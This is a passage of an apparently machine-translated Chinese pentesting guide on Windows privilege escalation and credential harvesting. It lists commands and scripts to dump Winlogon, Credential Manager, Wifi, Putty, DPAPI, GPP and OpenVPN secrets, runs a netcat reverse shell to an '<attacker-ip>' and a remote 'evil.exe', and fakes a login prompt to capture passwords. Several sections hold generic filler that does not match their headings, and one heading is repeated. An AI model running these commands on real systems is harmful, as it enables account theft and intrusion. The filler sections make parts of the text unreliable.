### ARP表

The Address Resolution Protocol (ARP) is a protocol used to map an IP address to a physical (MAC) address on a local network. The ARP table, also known as the ARP cache, is a table that stores the mappings between IP addresses and MAC addresses.

ARP表是一种用于在本地网络上将IP地址映射到物理（MAC）地址的协议，称为地址解析协议（ARP）。ARP表，也称为ARP缓存，是一种存储IP地址和MAC地址之间映射关系的表格。

The ARP table is maintained by the operating system and is used to efficiently route network traffic. When a device wants to send data to another device on the same network, it checks the ARP table to find the MAC address associated with the destination IP address. If the MAC address is not found in the table, the device will send an ARP request to the network asking for the MAC address of the destination device. Once the MAC address is obtained, it is added to the ARP table for future use.

ARP表由操作系统维护，并用于有效地路由网络流量。当设备想要向同一网络上的另一个设备发送数据时，它会检查ARP表以查找与目标IP地址相关联的MAC地址。如果在表中找不到MAC地址，设备将向网络发送ARP请求，询问目标设备的MAC地址。一旦获取到MAC地址，它将被添加到ARP表中以供将来使用。

The ARP table can be viewed using the `arp` command in Windows. This command displays the IP address, MAC address, and type of each entry in the ARP table.

可以使用Windows中的`arp`命令查看ARP表。该命令显示ARP表中每个条目的IP地址、MAC地址和类型。

```plaintext
C:\> arp -a
Interface: 192.168.1.10 --- 0x2
  Internet Address      Physical Address      Type
  192.168.1.1           00-11-22-33-44-55     dynamic
  192.168.1.100         00-AA-BB-CC-DD-EE     dynamic
```

In the example above, the ARP table has two entries. The first entry maps the IP address `192.168.1.1` to the MAC address `00-11-22-33-44-55`, and the second entry maps the IP address `192.168.1.100` to the MAC address `00-AA-BB-CC-DD-EE`.

在上面的示例中，ARP表有两个条目。第一个条目将IP地址`192.168.1.1`映射到MAC地址`00-11-22-33-44-55`，第二个条目将IP地址`192.168.1.100`映射到MAC地址`00-AA-BB-CC-DD-EE`。
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### 防火墙规则

[**查看此页面以获取与防火墙相关的命令**](../basic-cmd-for-pentesters.md#firewall) **（列出规则，创建规则，关闭，打开...）**

更多[网络枚举的命令在这里](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
二进制文件 `bash.exe` 也可以在 `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` 中找到。

如果你获得了 root 用户权限，你可以监听任意端口（第一次使用 `nc.exe` 监听端口时，它会通过 GUI 询问是否允许防火墙通过 `nc`）。
```
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
要轻松以root身份启动bash，可以尝试使用`--default-user root`。

您可以在文件夹`C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`中浏览WSL文件系统。

## Windows凭据

### Winlogon凭据
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### 凭据管理器 / Windows Vault

从[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault) \
Windows Vault存储了用户的服务器、网站和其他程序的凭据，使得Windows可以自动登录用户。乍一看，这似乎意味着用户可以存储他们的Facebook凭据、Twitter凭据、Gmail凭据等，以便他们可以通过浏览器自动登录。但事实并非如此。

Windows Vault存储的是Windows可以自动登录用户的凭据，这意味着任何需要凭据来访问资源（服务器或网站）的Windows应用程序都可以利用凭据管理器和Windows Vault，并使用提供的凭据，而不是用户一直输入用户名和密码。

除非应用程序与凭据管理器进行交互，否则我认为它们无法使用给定资源的凭据。因此，如果您的应用程序想要使用Vault，它应该以某种方式与凭据管理器进行通信，并从默认存储Vault请求该资源的凭据。

使用`cmdkey`命令列出机器上存储的凭据。
```
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
然后，您可以使用`runas`命令和`/savecred`选项来使用保存的凭据。以下示例是通过SMB共享调用远程二进制文件。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
使用提供的凭据使用 `runas` 命令。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
请注意，mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials\_file\_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault\_password\_view.html)，或者来自[Empire Powershells模块](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/dumpCredStore.ps1)都可以用来获取凭证。

### DPAPI

理论上，数据保护API可以对任何类型的数据进行对称加密；实际上，在Windows操作系统中，它主要用于使用用户或系统密钥作为熵的重要贡献来执行非对称私钥的对称加密。

**DPAPI允许开发人员使用从用户登录凭据派生的对称密钥来加密密钥**，或者在系统加密的情况下，使用系统的域身份验证凭据。

用于加密用户RSA密钥的DPAPI密钥存储在`%APPDATA%\Microsoft\Protect\{SID}`目录下，其中{SID}是该用户的[安全标识符](https://en.wikipedia.org/wiki/Security\_Identifier)。**DPAPI密钥存储在与保护用户私钥的主密钥相同的文件中**。它通常是64个字节的随机数据。（请注意，此目录受保护，因此无法使用cmd的`dir`命令列出，但可以使用PS列出）。
```
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
您可以使用**mimikatz模块** `dpapi::masterkey` 和适当的参数 (`/pvk` 或 `/rpc`) 来解密它。

通常，由主密码保护的**凭据文件**位于：
```
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
您可以使用**mimikatz模块** `dpapi::cred` 和适当的 `/masterkey` 进行解密。\
您可以使用 `sekurlsa::dpapi` 模块（如果您是root用户），从**内存**中提取出许多DPAPI的**主密钥**。

{% content-ref url="dpapi-extracting-passwords.md" %}
[dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
{% endcontent-ref %}

### PowerShell凭据

**PowerShell凭据**通常用于**脚本编写**和自动化任务，以便方便地存储加密凭据。这些凭据使用**DPAPI**进行保护，通常只能由创建它们的同一用户在同一台计算机上解密。

要从包含凭据的文件中**解密**PS凭据，您可以执行以下操作：
```
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi

### Wifi

Wifi是一种无线网络技术，允许设备通过无线信号进行互联和访问互联网。它是一种常见的网络连接方式，广泛应用于家庭、办公室和公共场所。

Wifi连接通常需要一个无线路由器或接入点，它将有线网络连接转换为无线信号，并通过无线网络协议（如802.11）将信号传输到设备。设备可以通过输入正确的无线网络名称（SSID）和密码来连接到Wifi网络。

Wifi连接的优点包括便捷性、灵活性和可移动性。用户可以在覆盖范围内自由移动，并在多个设备之间共享网络连接。然而，Wifi连接也存在一些安全风险，如未加密的网络、弱密码和网络钓鱼攻击。

为了保护Wifi网络安全，用户可以采取以下措施：

- 使用强密码保护Wifi网络，包括字母、数字和特殊字符的组合。
- 启用网络加密，如WPA2（Wi-Fi Protected Access II）。
- 定期更改Wifi密码，以防止未经授权的访问。
- 禁用无线网络广播，以减少被发现的风险。
- 使用防火墙和安全软件来检测和阻止潜在的网络攻击。

通过采取这些措施，用户可以增强Wifi网络的安全性，并保护个人信息和设备免受潜在的网络威胁。
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
```
### 已保存的RDP连接

您可以在 `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\` 和 `HKCU\Software\Microsoft\Terminal Server Client\Servers\` 中找到它们。

### 最近运行的命令
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **远程桌面凭据管理器**

The Remote Desktop Credential Manager is a Windows feature that allows users to store and manage their remote desktop credentials. It securely stores usernames and passwords for remote desktop connections, making it easier for users to connect to remote systems without having to enter their credentials every time.

远程桌面凭据管理器是Windows的一个功能，允许用户存储和管理他们的远程桌面凭据。它安全地存储远程桌面连接的用户名和密码，使用户能够更轻松地连接到远程系统，而无需每次都输入凭据。

By default, the Remote Desktop Credential Manager is enabled on Windows systems. However, it is important to be aware of the potential security risks associated with storing credentials in this manner. If an attacker gains access to a user's account, they may be able to extract the stored credentials and use them to gain unauthorized access to other systems.

默认情况下，远程桌面凭据管理器在Windows系统上是启用的。然而，需要注意以这种方式存储凭据可能存在的安全风险。如果攻击者获得了用户的帐户访问权限，他们可能能够提取存储的凭据并使用它们来未经授权地访问其他系统。

To mitigate this risk, it is recommended to use strong, unique passwords for remote desktop connections and regularly update them. Additionally, consider using multi-factor authentication for added security.

为了减轻这种风险，建议为远程桌面连接使用强大且唯一的密码，并定期更新它们。此外，考虑使用多因素身份验证以增加安全性。

It is also important to regularly review and remove any unnecessary or outdated credentials stored in the Remote Desktop Credential Manager. This helps to minimize the potential attack surface and reduce the risk of unauthorized access.

定期审查并删除存储在远程桌面凭据管理器中的任何不必要或过时的凭据也非常重要。这有助于最小化潜在的攻击面，并降低未经授权访问的风险。
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
使用适当的`/masterkey`，使用**Mimikatz**的`dpapi::rdg`模块来解密任何.rdg文件\
您可以使用Mimikatz的`sekurlsa::dpapi`模块从内存中提取许多DPAPI主密钥

### 便签

人们经常在Windows工作站上使用便签应用程序来保存密码和其他信息，而不知道它是一个数据库文件。该文件位于`C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`，值得搜索和检查。

### AppCmd.exe

**请注意，要从AppCmd.exe中恢复密码，您需要是管理员并在高完整性级别下运行。**\
**AppCmd.exe**位于`%systemroot%\system32\inetsrv\`目录中。\
如果存在此文件，则可能已配置了一些凭据，并且可以进行恢复。

此代码摘自_**PowerUP**_：
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

检查 `C:\Windows\CCM\SCClient.exe` 是否存在。\
安装程序以**SYSTEM特权运行**，许多程序容易受到**DLL侧加载攻击（信息来自** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**）。**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## 文件和注册表（凭证）

### Putty 凭证

```plaintext
Description: Putty is a popular SSH and telnet client for Windows. It stores its configuration settings, including saved sessions and credentials, in the Windows registry.

Location: HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions

Credentials: Putty stores the credentials for saved sessions in the registry. The credentials are stored in plain text, making them easily accessible to an attacker with local access to the machine.

Mitigation: To protect the credentials stored in Putty, it is recommended to encrypt the registry or use a different SSH client that securely stores credentials.
```

```plaintext
描述：Putty 是 Windows 上流行的 SSH 和 telnet 客户端。它将其配置设置（包括保存的会话和凭证）存储在 Windows 注册表中。

位置：HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions

凭证：Putty 在注册表中存储了保存会话的凭证。这些凭证以明文形式存储，使得攻击者在本地访问机器时很容易获取。

缓解措施：为了保护存储在 Putty 中的凭证，建议加密注册表或使用其他安全存储凭证的 SSH 客户端。
```
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH 主机密钥

Putty 是一种常用的 SSH 客户端，用于与远程服务器建立安全连接。在使用 Putty 连接服务器时，会生成一个主机密钥，用于验证服务器的身份。这些主机密钥存储在本地计算机上，以确保下次连接时能够正确验证服务器。

#### 主机密钥的位置

Putty 主机密钥存储在 Windows 注册表中的以下位置：

```
HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\SshHostKeys
```

#### 密钥类型

Putty 支持多种类型的主机密钥，包括 RSA、DSA 和 ECDSA。每个密钥类型都有一个唯一的标识符，用于在注册表中存储和识别密钥。

#### 密钥值

每个主机密钥都有一个对应的值，该值是一个包含密钥信息的字符串。这些字符串可以通过 Putty 的界面或命令行工具来获取。

#### 密钥的安全性

主机密钥的安全性非常重要，因为它们用于验证服务器的身份。如果主机密钥泄漏或被篡改，可能会导致中间人攻击或其他安全问题。

为了确保主机密钥的安全性，建议定期检查密钥的完整性，并确保只信任正确的密钥。如果发现任何问题，应立即采取措施修复或重新生成主机密钥。

#### 总结

Putty SSH 主机密钥是用于验证服务器身份的重要组成部分。了解主机密钥的位置、类型、值和安全性是保护服务器连接安全的关键。
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### 注册表中的SSH密钥

SSH私钥可以存储在注册表键`HKCU\Software\OpenSSH\Agent\Keys`中，因此您应该检查其中是否有任何有趣的内容：
```
reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
```
如果您在该路径中找到任何条目，它很可能是一个保存的SSH密钥。它被加密存储，但可以使用[https://github.com/ropnop/windows\_sshagent\_extract](https://github.com/ropnop/windows\_sshagent\_extract)轻松解密。\
有关此技术的更多信息，请参阅：[https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

如果`ssh-agent`服务未运行，并且您希望它在启动时自动启动，请运行：
```
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
{% hint style="info" %}
看起来这个技术已经不再有效了。我尝试创建了一些SSH密钥，使用`ssh-add`添加了它们，并通过SSH登录到一台机器。注册表HKCU\Software\OpenSSH\Agent\Keys不存在，并且procmon在非对称密钥认证期间没有识别到`dpapi.dll`的使用。
{% endhint %}

### 无人值守文件
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
您还可以使用**metasploit**搜索这些文件：_post/windows/gather/enum\_unattend_

示例内容：
```markup
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM和SYSTEM备份

It is common for Windows systems to create backups of the SAM and SYSTEM files, which contain important security information such as user account passwords. These backups can be used to perform offline attacks and escalate privileges on a local system.

在Windows系统中，常常会创建SAM和SYSTEM文件的备份，这些文件包含了重要的安全信息，如用户账户密码。这些备份可以用于离线攻击，并在本地系统上升权限。

To locate these backups, you can search for files with the extensions `.bak`, `.old`, or `.sav` in the `%SystemRoot%\repair` directory or the `%SystemRoot%\System32\config` directory.

要找到这些备份，可以在`%SystemRoot%\repair`目录或`%SystemRoot%\System32\config`目录中搜索扩展名为`.bak`、`.old`或`.sav`的文件。

Once you have identified the backup files, you can extract the SAM and SYSTEM files from them using tools like `samdump2` or `pwdump`.

一旦确定了备份文件，可以使用`samdump2`或`pwdump`等工具从中提取出SAM和SYSTEM文件。

These extracted files can then be used with tools like `John the Ripper` or `Hashcat` to crack the password hashes and gain access to user accounts.

然后，可以使用`John the Ripper`或`Hashcat`等工具来破解密码哈希，并获取对用户账户的访问权限。

It is important to note that accessing and using these backups without proper authorization is illegal and unethical. These techniques should only be used for legitimate purposes such as system administration or penetration testing with proper authorization.

需要注意的是，未经适当授权访问和使用这些备份是非法和不道德的。这些技术只应用于合法目的，如系统管理或经过适当授权的渗透测试。
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### 云凭证

Cloud credentials refer to the authentication information used to access and manage cloud services and resources. These credentials typically include a username and password, API keys, access tokens, or other forms of authentication tokens.

云凭证是用于访问和管理云服务和资源的身份验证信息。这些凭证通常包括用户名和密码、API密钥、访问令牌或其他形式的身份验证令牌。

It is crucial to protect cloud credentials as they grant access to sensitive data and resources. If these credentials are compromised, an attacker can gain unauthorized access to the cloud environment and potentially perform malicious activities.

保护云凭证至关重要，因为它们授予对敏感数据和资源的访问权限。如果这些凭证被攻击者获取，攻击者可以未经授权地访问云环境，并有可能进行恶意活动。

To enhance the security of cloud credentials, it is recommended to follow best practices such as:

为了增强云凭证的安全性，建议遵循以下最佳实践：

- **Use strong and unique passwords**: Choose complex passwords that are difficult to guess and avoid reusing passwords across different accounts.

- **使用强密码和唯一密码**：选择难以猜测的复杂密码，并避免在不同的账户之间重复使用密码。

- **Enable multi-factor authentication (MFA)**: Implement MFA to add an extra layer of security by requiring additional verification, such as a code sent to a mobile device, in addition to the password.

- **启用多因素身份验证（MFA）**：通过要求额外的验证（例如发送到移动设备的代码）来实施MFA，以增加额外的安全层。

- **Regularly rotate credentials**: Change passwords and access tokens periodically to minimize the risk of unauthorized access.

- **定期更换凭证**：定期更改密码和访问令牌，以最大程度地减少未经授权的访问风险。

- **Limit access privileges**: Grant the minimum necessary permissions to users and regularly review and revoke unnecessary access privileges.

- **限制访问权限**：向用户授予最低必要权限，并定期审查和撤销不必要的访问权限。

By implementing these measures, organizations can significantly reduce the risk of unauthorized access to their cloud resources and protect sensitive data from being compromised.

通过实施这些措施，组织可以显著降低未经授权访问其云资源的风险，并保护敏感数据免遭泄露。
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

搜索名为**SiteList.xml**的文件

### 缓存的GPP密码

在KB2928120之前（参见MS14-025），某些组策略首选项可以配置为使用自定义帐户。这个功能主要用于在一组计算机上部署自定义本地管理员帐户。然而，这种方法存在两个问题。首先，由于组策略对象以XML文件的形式存储在SYSVOL中，任何域用户都可以读取它们。第二个问题是，这些GPP中设置的密码使用默认密钥进行AES256加密，该密钥是公开文档记录的。这意味着任何经过身份验证的用户都有可能访问非常敏感的数据，并在其计算机甚至域中提升其权限。此函数将检查任何本地缓存的GPP文件是否包含非空的"cpassword"字段。如果是，则将对其进行解密，并返回一个包含有关GPP的一些信息以及文件位置的自定义PS对象。

在`C:\ProgramData\Microsoft\Group Policy\history`或者在_**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history**（Windows Vista之前的版本）_中搜索这些文件：

* Groups.xml
* Services.xml
* Scheduledtasks.xml
* DataSources.xml
* Printers.xml
* Drives.xml

**解密cPassword的方法：**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
使用crackmapexec获取密码：
```shell-session
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web 配置

The IIS (Internet Information Services) web server is a popular choice for hosting websites on Windows systems. The web server's configuration file, known as the web.config file, contains settings that control various aspects of the server's behavior. This file is located in the root directory of the website.

IIS Web服务器是在Windows系统上托管网站的常见选择。Web服务器的配置文件称为web.config文件，其中包含控制服务器行为的各种设置。该文件位于网站的根目录中。

#### Common Web.config Settings

Here are some common settings that can be found in the web.config file:

- `<customErrors>`: This setting controls how errors are displayed to users. It can be set to display detailed error messages or to redirect users to a custom error page.

- `<authentication>`: This setting controls the authentication method used by the web server. It can be set to use Windows authentication, forms-based authentication, or other authentication methods.

- `<authorization>`: This setting controls which users or groups have access to specific resources on the server. It can be used to restrict access to certain directories or files.

- `<httpErrors>`: This setting controls how HTTP errors are handled by the server. It can be used to customize error pages or redirect users to specific URLs when errors occur.

- `<sessionState>`: This setting controls how session data is managed by the server. It can be set to use in-process session state or out-of-process session state using a separate session state server.

#### Modifying Web.config Settings

To modify the web.config file, you can use a text editor or the IIS Manager tool. Make sure to take a backup of the original file before making any changes.

To make changes using the IIS Manager tool, follow these steps:

1. Open the IIS Manager tool.
2. Navigate to the website you want to modify.
3. Double-click on the "Configuration Editor" icon.
4. Select the section you want to modify from the drop-down menu.
5. Make the necessary changes and click on "Apply" to save the changes.

#### Conclusion

Understanding the IIS web.config file and its settings is essential for managing and securing websites hosted on Windows systems. By modifying the web.config file, you can customize the behavior of the web server to meet your specific requirements.
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
以下是一个包含凭据的web.config示例：

```xml
<configuration>
  <appSettings>
    <add key="DatabaseUsername" value="admin" />
    <add key="DatabasePassword" value="password123" />
  </appSettings>
</configuration>
```

这是一个包含凭据的web.config示例。
```markup
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN凭据

To establish a connection with an OpenVPN server, you will need the following credentials:

- **Username**: Your assigned username for the OpenVPN server.
- **Password**: The corresponding password for your OpenVPN username.

These credentials are typically provided by the system administrator or the organization managing the OpenVPN server. Make sure to keep your credentials secure and avoid sharing them with unauthorized individuals.

### OpenVPN凭据

要与OpenVPN服务器建立连接，您需要以下凭据：

- **用户名**：您分配的OpenVPN服务器用户名。
- **密码**：与您的OpenVPN用户名相对应的密码。

这些凭据通常由系统管理员或管理OpenVPN服务器的组织提供。请确保保护好您的凭据，避免与未经授权的人员共享。
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### 日志

Logs, also known as log files, are records of events or actions that occur on a computer system. They are essential for troubleshooting, monitoring, and auditing purposes. In the context of local privilege escalation, logs can be a valuable source of information for identifying vulnerabilities and potential attack vectors.

Logs can provide insights into various activities, such as user logins, system events, network connections, and application usage. By analyzing these logs, security professionals can detect suspicious or unauthorized activities that may indicate a privilege escalation attempt.

Common log files in Windows systems include:

- **Event Viewer**: This tool provides access to various logs, such as the Security log, which records security-related events like logon attempts, privilege changes, and object access.
- **Windows Event Log**: This log contains information about system events, errors, and warnings.
- **Application Logs**: These logs capture events related to specific applications or services running on the system.
- **System Logs**: These logs record system-level events, such as driver installations, hardware changes, and system startup/shutdown.

To effectively utilize logs for local privilege escalation, it is important to:

1. Regularly review and analyze log files for any suspicious activities.
2. Enable auditing and logging features to capture relevant events.
3. Configure log retention policies to ensure logs are retained for an appropriate duration.
4. Implement log monitoring and alerting mechanisms to promptly detect and respond to potential security incidents.

Remember that logs alone may not provide a complete picture of an attack. They should be used in conjunction with other security measures and techniques to enhance the overall security posture of a system.
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### 请求凭据

您可以始终**要求用户输入其凭据，甚至是其他用户的凭据**，如果您认为他们可能知道这些凭据（请注意，直接向客户**要求凭据**非常**危险**）：
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **可能包含凭据的文件名**

已知的一些文件曾经以明文或Base64形式包含**密码**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
